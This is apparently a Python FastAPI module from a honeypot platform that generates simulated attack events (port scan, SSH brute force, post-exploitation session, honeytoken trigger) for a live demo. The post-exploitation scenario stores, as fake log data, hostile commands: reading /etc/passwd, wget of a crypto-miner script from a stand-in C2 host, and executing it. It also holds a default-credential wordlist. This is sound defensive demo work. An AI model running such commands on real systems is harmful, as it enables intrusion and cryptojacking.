import asyncio
import uuid
import datetime
import random
from typing import Dict, Any
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from honeyforge_server.app.database import get_db
from honeyforge_server.app.models import Trap, AttackEvent, SessionLog, Honeytoken
from honeyforge_server.app.alert_engine import process_event_for_alerts
from honeyforge_server.app.websocket_hub import ws_hub

router = APIRouter(prefix="/simulator", tags=["Live Attack Simulator"])

@router.post("/run")
async def run_attack_simulation(payload: Dict[str, Any], db: AsyncSession = Depends(get_db)):
    """
    Executes automated live cyberattack scenarios to demonstrate the platform to judges in real time!
    """
    scenario = payload.get("scenario", "port_scan")
    target_trap_id = payload.get("trap_id", "trap-medium-01")
    
    # Check if trap exists, if not find any trap or create demo trap
    trap_res = await db.execute(select(Trap).where(Trap.trap_id == target_trap_id))
    trap = trap_res.scalars().first()
    if not trap:
        first_trap = await db.execute(select(Trap))
        trap = first_trap.scalars().first()
        if trap:
            target_trap_id = trap.trap_id

    attacker_ip = f"198.51.100.{random.randint(10, 250)}"
    now = datetime.datetime.utcnow()
    results = []

    if scenario == "port_scan":
        # Scenario 1: Port Reconnaissance Scan (Low Interaction)
        ports = [21, 22, 23, 80, 443, 6379, 8080]
        for p in ports:
            ev = AttackEvent(
                event_id=str(uuid.uuid4()),
                trap_id=target_trap_id,
                timestamp=datetime.datetime.utcnow(),
                source_ip=attacker_ip,
                source_port=random.randint(40000, 60000),
                protocol="TCP",
                destination_port=p,
                event_type="port_scan",
                severity="low",
                payload_raw=f"SYN Probe seq={random.randint(1000, 9999)} window=64240",
                is_ioc=False,
                geo_country="Germany",
                geo_city="Frankfurt"
            )
            db.add(ev)
            await db.commit()
            await db.refresh(ev)
            await process_event_for_alerts(db, ev)
            await ws_hub.broadcast("attack_event", {
                "id": ev.id,
                "event_id": ev.event_id,
                "trap_id": ev.trap_id,
                "trap_name": trap.name if trap else "Demo Trap",
                "timestamp": ev.timestamp.isoformat(),
                "source_ip": ev.source_ip,
                "source_port": ev.source_port,
                "protocol": ev.protocol,
                "destination_port": ev.destination_port,
                "event_type": ev.event_type,
                "severity": ev.severity,
                "payload_raw": ev.payload_raw,
                "geo_country": ev.geo_country,
                "geo_city": ev.geo_city
            })
            results.append(ev.event_id)
            await asyncio.sleep(0.05)

    elif scenario == "ssh_brute_force":
        # Scenario 2: High Velocity Credential Brute-Force (Medium Interaction)
        wordlist = [
            ("root", "123456"),
            ("admin", "admin"),
            ("ubuntu", "ubuntu123"),
            ("support", "welcome1"),
            ("root", "toor"),
            ("deploy", "docker2024")
        ]
        for user, pwd in wordlist:
            ev = AttackEvent(
                event_id=str(uuid.uuid4()),
                trap_id=target_trap_id,
                timestamp=datetime.datetime.utcnow(),
                source_ip=attacker_ip,
                source_port=random.randint(40000, 60000),
                protocol="SSH",
                destination_port=2222,
                event_type="auth_attempt",
                severity="medium" if user != "root" else "high",
                credentials={"username": user, "password": pwd},
                payload_raw=f"SSH auth failure: {user}:{pwd}",
                is_ioc=True,
                geo_country="Netherlands",
                geo_city="Amsterdam"
            )
            db.add(ev)
            await db.commit()
            await db.refresh(ev)
            await process_event_for_alerts(db, ev)
            await ws_hub.broadcast("attack_event", {
                "id": ev.id,
                "event_id": ev.event_id,
                "trap_id": ev.trap_id,
                "trap_name": trap.name if trap else "Demo Trap",
                "timestamp": ev.timestamp.isoformat(),
                "source_ip": ev.source_ip,
                "source_port": ev.source_port,
                "protocol": ev.protocol,
                "destination_port": ev.destination_port,
                "event_type": ev.event_type,
                "severity": ev.severity,
                "credentials": ev.credentials,
                "payload_raw": ev.payload_raw,
                "geo_country": ev.geo_country,
                "geo_city": ev.geo_city
            })
            results.append(ev.event_id)
            await asyncio.sleep(0.08)

    elif scenario == "post_exploitation":
        # Scenario 3: Interactive Shell & Malware Ingestion
        sess_id = f"sess-{uuid.uuid4().hex[:8]}"
        commands = [
            {"cmd": "whoami", "output": "root\n"},
            {"cmd": "uname -a", "output": "Linux prod-srv-01 5.15.0-89-generic x86_64\n"},
            {"cmd": "cat /etc/passwd", "output": "root:x:0:0:root:/root:/bin/bash\ndeploy:x:1001:1001::/home/deploy:/bin/bash\n"},
            {"cmd": "wget http://c2.darknet-bot.xyz/xmrig-miner.sh", "output": "Connecting to c2.darknet-bot.xyz... 200 OK\nLength: 1048576 (1.0M)\nSaving to: 'xmrig-miner.sh'\n"},
            {"cmd": "chmod +x xmrig-miner.sh && ./xmrig-miner.sh", "output": "[*] Starting stealth cryptocurrency miner...\n"}
        ]
        malware_hash = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        
        sess = SessionLog(
            session_id=sess_id,
            trap_id=target_trap_id,
            source_ip=attacker_ip,
            protocol="SSH",
            started_at=now,
            total_commands=len(commands),
            commands_history=[{"timestamp": (now + datetime.timedelta(seconds=i*2)).isoformat(), **c} for i, c in enumerate(commands)],
            captured_artifacts=[{"sha256": malware_hash, "filename": "xmrig-miner.sh", "size": 1048576}]
        )
        db.add(sess)
        
        # Attack event for malware download
        ev = AttackEvent(
            event_id=str(uuid.uuid4()),
            trap_id=target_trap_id,
            timestamp=now,
            source_ip=attacker_ip,
            source_port=54321,
            protocol="SSH",
            destination_port=2222,
            event_type="file_download",
            severity="critical",
            command_text="wget http://c2.darknet-bot.xyz/xmrig-miner.sh",
            artifact_hash=malware_hash,
            session_id=sess_id,
            is_ioc=True,
            geo_country="Russian Federation",
            geo_city="Saint Petersburg"
        )
        db.add(ev)
        await db.commit()
        await db.refresh(ev)
        await process_event_for_alerts(db, ev)
        await ws_hub.broadcast("attack_event", {
            "id": ev.id,
            "event_id": ev.event_id,
            "trap_id": ev.trap_id,
            "trap_name": trap.name if trap else "Demo Trap",
            "timestamp": ev.timestamp.isoformat(),
            "source_ip": ev.source_ip,
            "source_port": ev.source_port,
            "protocol": ev.protocol,
            "destination_port": ev.destination_port,
            "event_type": ev.event_type,
            "severity": ev.severity,
            "command_text": ev.command_text,
            "artifact_hash": ev.artifact_hash,
            "session_id": ev.session_id,
            "geo_country": ev.geo_country,
            "geo_city": ev.geo_city
        })
        results.append(ev.event_id)

    elif scenario == "honeytoken_breach":
        # Scenario 4: Honeytoken Trigger
        token_res = await db.execute(select(Honeytoken).where(Honeytoken.trap_id == target_trap_id))
        token = token_res.scalars().first()
        if not token:
            token = Honeytoken(
                token_id=f"ht-{uuid.uuid4().hex[:8]}",
                token_type="aws_key",
                token_value="AKIAIOSFODNN7EXAMPLE:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
                canary_path="/root/.aws/credentials",
                trap_id=target_trap_id,
                description="Canary Production AWS Keys",
                is_triggered=True,
                triggered_at=now,
                triggered_by_ip=attacker_ip
            )
            db.add(token)
        else:
            token.is_triggered = True
            token.triggered_at = now
            token.triggered_by_ip = attacker_ip
            
        ev = AttackEvent(
            event_id=str(uuid.uuid4()),
            trap_id=target_trap_id,
            timestamp=now,
            source_ip=attacker_ip,
            source_port=44321,
            protocol="HTTP",
            destination_port=443,
            event_type="honeytoken_triggered",
            severity="critical",
            payload_raw=f"Honeytoken accessed: {token.description} ({token.canary_path})",
            is_ioc=True,
            geo_country="United States",
            geo_city="Ashburn"
        )
        db.add(ev)
        await db.commit()
        await db.refresh(ev)
        await process_event_for_alerts(db, ev)
        await ws_hub.broadcast("attack_event", {
            "id": ev.id,
            "event_id": ev.event_id,
            "trap_id": ev.trap_id,
            "trap_name": trap.name if trap else "Demo Trap",
            "timestamp": ev.timestamp.isoformat(),
            "source_ip": ev.source_ip,
            "source_port": ev.source_port,
            "protocol": ev.protocol,
            "destination_port": ev.destination_port,
            "event_type": ev.event_type,
            "severity": ev.severity,
            "payload_raw": ev.payload_raw,
            "geo_country": ev.geo_country,
            "geo_city": ev.geo_city
        })
        results.append(ev.event_id)

    return {
        "status": "success",
        "scenario": scenario,
        "attacker_ip": attacker_ip,
        "events_generated": len(results)
    }
